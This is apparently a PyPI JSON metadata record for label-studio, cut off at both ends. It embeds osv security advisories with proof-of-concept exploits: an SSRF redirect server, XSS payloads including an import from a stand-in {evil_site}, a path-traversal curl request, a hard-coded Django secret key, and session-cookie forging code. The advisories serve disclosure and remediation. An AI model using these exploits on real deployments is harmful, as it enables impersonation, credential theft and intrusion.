(>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","pyyaml (>=5.3.1)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.0.post4","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"45203036e3bbd4e4a566d706bad15703cfced2565eaff5a4999e44d79a969f06","md5":"ba29e070a910622cacc5dda33d8c9a88","sha256":"630c8f15b991fda4345f689bc6c0ae00bf1f5b8ef5c2c1e957946da2482651f8"},"downloads":-1,"filename":"label_studio-0.9.0.post4-py3-none-any.whl","has_sig":false,"md5_digest":"ba29e070a910622cacc5dda33d8c9a88","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":18875171,"upload_time":"2021-01-18T10:16:57","upload_time_iso_8601":"2021-01-18T10:16:57.285156Z","url":"https://files.pythonhosted.org/packages/45/20/3036e3bbd4e4a566d706bad15703cfced2565eaff5a4999e44d79a969f06/label_studio-0.9.0.post4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"940a2d3b7c5047874d2e7a3a191b7260fb83a0a7f32e6d97d141d0a851dfd64b","md5":"d79c1f446bdf1a3c6418efa6693179e0","sha256":"03befd04d6282d1d7fcb9c9bad731da8ba7d52861b65a6a82cd59452084600bc"},"downloads":-1,"filename":"label-studio-0.9.0.post4.tar.gz","has_sig":false,"md5_digest":"d79c1f446bdf1a3c6418efa6693179e0","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":18707365,"upload_time":"2021-01-18T10:17:15","upload_time_iso_8601":"2021-01-18T10:17:15.912779Z","url":"https://files.pythonhosted.org/packages/94/0a/2d3b7c5047874d2e7a3a191b7260fb83a0a7f32e6d97d141d0a851dfd64b/label-studio-0.9.0.post4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, 